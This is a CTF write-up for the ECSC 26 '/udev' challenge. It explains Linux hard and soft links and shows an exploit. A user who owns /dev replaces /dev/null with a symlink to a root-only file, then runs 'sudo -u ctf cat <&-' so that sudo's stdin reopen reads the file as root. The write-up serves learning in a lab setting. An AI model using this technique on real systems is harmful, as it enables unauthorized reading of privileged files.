@@ -1,0 +1,157 @@
+---
+title: 'ECSC 26 Finals - /udev - true innovation - Misc challange'
+description: 'ECSC 26 Finals - /udev - true innovation - Misc challange'
+date: 2026-10-18T20:00:00+01:00
+tags: ['ecsc','ecsc26','ecsc26finals','misc','ctf','writeup']
+image: './ecsc_26.png'
+authors: ['manfcg']
+---
+
+## /udev - true innovation
+*(9 solves)*
+
+I did not manage to solve the challenge in time, but I really enjoyed learning about it afterwards!
+
+The description of the challange:
+> You may have heard of FUSE and UBLK, but those are just bandaids that don't address the core issue Introducing "/udev", finally giving the users full control over the /dev filesystem. You don't need to be root anymore if you can just alter /dev as a low priv user :9Head:.
+
+Additionally, we have a [slash-udev.zip](https://files.ecsc2026.de/99ec6016990fdf2e8cfe816ffa52fe14683eff2468850fd0c44e425a19731f8b/slash-udev.zip) attachment.
+
+We're provided with two files: `Dockerfile` and `run.sh`. The `Dockerfile` is based on an Ubuntu image, and we can reach the running container over SSH as the `ctf` user, which has no password. The flag is being stored at `/flag.txt`, it belongs to root and only root can read it. When we're trying to reach it as the `ctf` user, we get a permission denied error.
+
+```bash
+ctf@slash-udev-pod-main-slash-udev-479rf:/dev$ cat /flag.txt
+cat: /flag.txt: Permission denied
+```
+
+The `run.sh` script is responsible for starting `sshd`, which is what lets us connect to the box in the first place. The instancer gave us copy-paste command to connect, so there's nothing to figure out at this stage:
+
+```bash
+ssh 7lryjs7se2uikmwauifqq7hsmh-main-3000-slash-udev@ecsc.jetzt
+```
+
+Beyond launching SSH, `run.sh` also hands the ctf user full ownership of `/dev` and `/dev/null`. [`/dev`](https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/dev.html) is the location in linux for special or devices files. [`/dev/null`](https://www.digitalocean.com/community/tutorials/dev-null-in-linux) behaves like a bin, whatever get written to it, will be discarded. When we try to read it with
+
+```bash
+ctf@slash-udev-pod-main-slash-udev-479rf:/dev$ cat /dev/null
+```
+
+it returns "nothing", but what we actually get back is the end-of-file (EOF) marker right away.
+
+Another detail here is that the Dockerfile compiles its own copy of `sudo` from a specific sudo-project branch: git clone --depth=1 --branch v1.9.17p2 https://github.com/sudo-project/sudo/. That tag happens to be the latest release, but chasing it leads nowhere - it's a red herring.
+
+## Vulnerability Analysis
+In linux [everything is a file](https://en.wikipedia.org/wiki/Everything_is_a_file), so we can remove `/dev/null`, and create a [soft symlink](https://www.redhat.com/en/blog/linking-linux-explained) to `/flag.txt` in its place.
+
+A link is the association between a filename and the actual data sitting on the filesystem. In fact, every time you create a file you're already making a hard link - you're tying a filename to some content. You can add more hard links yourself with `ln <original path> <new link path>`, which gives you two filenames that both refer to the exact same file body.
+
+Take a simple example:
+```bash
+echo "abc" > a.txt
+```
+
+Running `ls -al` shows this:
+```bash
+total 0
+drwxrwxrwx 1 ubuntu ubuntu 4096 Oct 14 01:38 .
+drwxrwxrwx 1 ubuntu ubuntu 4096 Oct 14 01:38 ..
+-rwxrwxrwx 1 ubuntu ubuntu    3 Oct 14 01:38 a.txt
+```
+
+That lone `1` sitting between the permission bits (`-rwxrwxrwx`) and the owner (`ubuntu`) is the link count - how many hard links currently point at that content. Add one with:
+```bash
+ln a.txt b.txt
+```
+
+and the count ticks up to 2:
+
+```bash
+total 0
+drwxrwxrwx 1 ubuntu ubuntu 4096 Oct 14 01:40 .
+drwxrwxrwx 1 ubuntu ubuntu 4096 Oct 14 01:38 ..
+-rwxrwxrwx 2 ubuntu ubuntu    3 Oct 14 01:38 a.txt
+-rwxrwxrwx 2 ubuntu ubuntu    3 Oct 14 01:38 b.txt
+```
+
+To confirm the two names really share the same content, use `ls -li`, which also prints the `inode` number tied to that content at the start of each line:
+```bash
+total 0
+9570149208518500 -rwxrwxrwx 2 ubuntu ubuntu 3 Oct 14 01:38 a.txt
+9570149208518500 -rwxrwxrwx 2 ubuntu ubuntu 3 Oct 14 01:38 b.txt
+```
+
+Soft links (also called symbolic links) work quite differently. They can point at both regular and non-regular files, and unlike hard links they work across separate filesystems. A soft link isn't an ordinary file. You create one by adding the `-s` flag:
+```bash
+ln -s a.txt c.txt
+```
+
+Now `ls -li` reveals a distinct `inode` number for `c.txt`, and `ls` renders it differently to flag it as a special file:
+```bash
+total 0
+ 9570149208518500 -rwxrwxrwx 2 ubuntu ubuntu 3 Oct 14 01:38 a.txt
+ 9570149208518500 -rwxrwxrwx 2 ubuntu ubuntu 3 Oct 14 01:38 b.txt
+12103423999168826 lrwxrwxrwx 1 ubuntu ubuntu 5 Oct 14 01:45 c.txt -> a.txt
+```
+
+The key difference shows up when you delete the original. With a hard link, the content survives - removing one name just drops the link count, and any remaining name still reads the data fine. A soft link, on the other hand, only ever stored a path, so once the original filename is gone it dangles and complains that the file or directory no longer exists.
+
+## Exploit
+
+As I wrote earlier, as `ctf` user we own `/dev/` and `/dev/null`. Also, `/dev/null` is a file - can be read from and written to.
+```bash
+rm /dev/null
+```
+
+The next step is to replace `/dev/null` with a symbolic link pointing at `/flag.txt`. Since we own `/dev`, the null entry inside it is ours to redefine. A hard link won't work here - attempting one fails with:
+
+`ln: failed to create hard link '/dev/null' => '/flag.txt': Invalid cross-device link`
+
+Soft links are far more forgiving, though you can point one at essentially anything, across filesystem boundaries included. So we create it with:
+
+`ln -s /flag.txt /dev/null`
+
+Checking `/dev` afterwards with `ls -li /dev` confirms that null now points to `/flag.txt`:
+
+```bash
+ctf@slash-udev-pod-main-slash-udev-sw46h:~$ ls -li /dev
+total 0
+        13 lrwxrwxrwx 1 root root   13 Oct 13 23:56 fd -> /proc/self/fd
+         8 crw-rw-rw- 1 root root 1, 7 Oct 13 23:56 full
+  72127127 drwxrwxrwt 2 root root   40 Oct 13 23:56 mqueue
+        17 lrwxrwxrwx 1 ctf  ctf     9 Oct 13 23:58 null -> /flag.txt
+        12 lrwxrwxrwx 1 root root    8 Oct 13 23:56 ptmx -> pts/ptmx
+         1 drwxr-xr-x 2 root root    0 Oct 13 23:56 pts
+         7 crw-rw-rw- 1 root root 1, 8 Oct 13 23:56 random
+         1 drwxrwxrwt 2 root root   40 Oct 13 23:56 shm
+        16 lrwxrwxrwx 1 root root   15 Oct 13 23:56 stderr -> /proc/self/fd/2
+        14 lrwxrwxrwx 1 root root   15 Oct 13 23:56 stdin -> /proc/self/fd/0
+        15 lrwxrwxrwx 1 root root   15 Oct 13 23:56 stdout -> /proc/self/fd/1
+6308726851 -rw-rw-rw- 1 root root    0 Oct 13 23:56 termination-log
+         9 crw-rw-rw- 1 root root 5, 0 Oct 13 23:56 tty
+        11 crw-rw-rw- 1 root root 1, 9 Oct 13 23:56 urandom
+        10 crw-rw-rw- 1 root root 1, 5 Oct 13 23:56 zero
+ctf@slash-udev-pod-main-slash-udev-sw46h:~$
+```
+
+To process, we need to know 4 basics of linux:
+
+1. `<` is the basic operator for redirecting input into a command.
+2. `&` tells the shell that the next character refers to a [file descriptor (FD)](https://en.wikipedia.org/wiki/File_descriptor) rather than a filename. For instance, 0 is the file descriptor for stdin (standard input).
+3. A `-` placed after `&` is special shell syntax for closing a file descriptor - which effectively means "hand back EOF straight away." (That's exactly what reading /dev/null normally gives you.)
+4. `sudo -u` runs a program as a chosen user instead of the default root. Plain `sudo <command>` means "run this as root," but adding `-u <user>` redirects it to that specific account. `sudo` itself is a privileged binary - it has to be, given that its whole job is managing who may act as whom.
+
+With those pieces in place, we can assemble the final payload:
+
+```bash
+ctf@slash-udev-pod-main-slash-udev-sw46h:~$ sudo -u ctf cat <&-
+ECSC{seizing_the_means_of_corruption}ctf@slash-udev-pod-main-slash-udev-sw46h:~$
+```
+
+### Why does it work?
+
+- `sudo` ensures that stdin, stdout and stderr are open before launching the command. If one of them is closed, it opens `/dev/null` and assigns the resulting file descriptor to it. This happens before sudo drops privileges and executes the command.
+- That reopening happens inside the privileged `sudo` process, so the `open()` call runs as root.
+- `sudo` opens `/dev/null` by path and trusts it blindly - it never checks that the path still points to the real null device.
+- Since we own `/dev`, we swapped `/dev/null` for a symlink to `/flag.txt`, so `sudo`'s "safe" reopen actually opens the flag as root and binds it to fd `0`.
+- `cat <&-` closes stdin on purpose, which is exactly the condition that triggers `sudo`'s reopen behaviour.
+- Permissions on an open fd are checked only once, at `open()` time - which `sudo` already passed as root - so by the time `cat` runs as `ctf`, it just reads the already-open flag and prints it.
